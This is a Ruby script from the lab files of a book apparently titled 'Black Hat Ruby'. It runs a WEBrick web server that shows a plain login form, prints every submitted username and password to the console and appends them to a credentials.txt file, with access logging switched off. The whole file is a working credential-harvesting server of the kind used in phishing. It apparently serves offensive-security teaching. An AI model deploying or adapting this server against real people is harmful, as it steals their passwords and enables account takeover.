#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Advanced usage of Ruby HTTP server
# Requirements:
#
require 'webrick'

#
# Servlet: Is a Web Server with custom behavior class
# It's a subclass of WEBrick::HTTPServlet::AbstractServlet
#
class RubyfuServlet < WEBrick::HTTPServlet::AbstractServlet

  # Control 'GET' request/response
  def do_GET(req, res)
    res.status = 200
    res['Content-Type']   = "text/html; charset=UTF-8"
    res['Server']         = "BlackHatRuby WebServer"
    res['Cache-Control']  = "no-store, no-cache,"
    res.body              = print_login(req)
  end

  private
  # Show login
  def print_login(req)
    html = %q{
      <center>
        <table cellpadding="3" border="1">
        <tr><td colspan="2"><center><h4><b>Enter your Username and Password</b></h4></center></td></tr>
        <form method="POST" action="/login">
                <tr><td><strong><b>Username:</b></strong></td><td><input name="username" type="text"></td></tr>
                <tr><td><strong><b>Password:</b></strong></td><td><input name="password" type="password"></td></tr>
                <tr><td colspan="2"><center><h1><b><input type="submit" value="Login" /></b></h1></center></td></tr>
        </form>
        </table>
      </center>
    }
  end

end

class Login < WEBrick::HTTPServlet::AbstractServlet

  # Control 'POST' request/response
  def do_POST(req, res)
    status, content_type, body = save_login(req)
    res.body  = body
  end

  # Save POST request
  def save_login(req)
    username, password = req.query['username'], req.query['password']

    if !(username && password).empty?
      # Print Credentials to console
      puts "\n-----[ START OF POST ]-----"
      puts "[+] #{username}:#{password}"
      puts "-----[ END OF POST ]-----\n\n"
      # Write Credentials to file
      File.open("credentials.txt", 'a') {|f| f.puts "#{username}:#{password}"}
      return 200, 'text/plain', 'Success! Thank you.'
    else
      puts "[!] Empty username and password."
      return 404, 'text/plain', 'Wrong username or password!'
    end

  end
end


begin
  port = ARGV[0]
  raise if ARGV.size < 1

  # Start Web Server
  puts "[+] Starting HTTP server on port: #{port}\n"
  server = WEBrick::HTTPServer.new(ServerName: "Rubyfu HTTP Server",
                                   Port: port,
                                   BindAddress: '0.0.0.0',
                                   AccessLog: [],
                                   Logger: WEBrick::Log.new(File.open(File::NULL, 'w'))
                                   )
  server.mount("/", RubyfuServlet)
  server.mount("/login", Login)
  trap "INT" do server.shutdown end
  server.start

rescue Exception => e
  puts "ruby #{__FILE__} <WEB_SERVER_PORT>" if ARGV.size < 1
  puts e, e.backtrace
  exit 0
end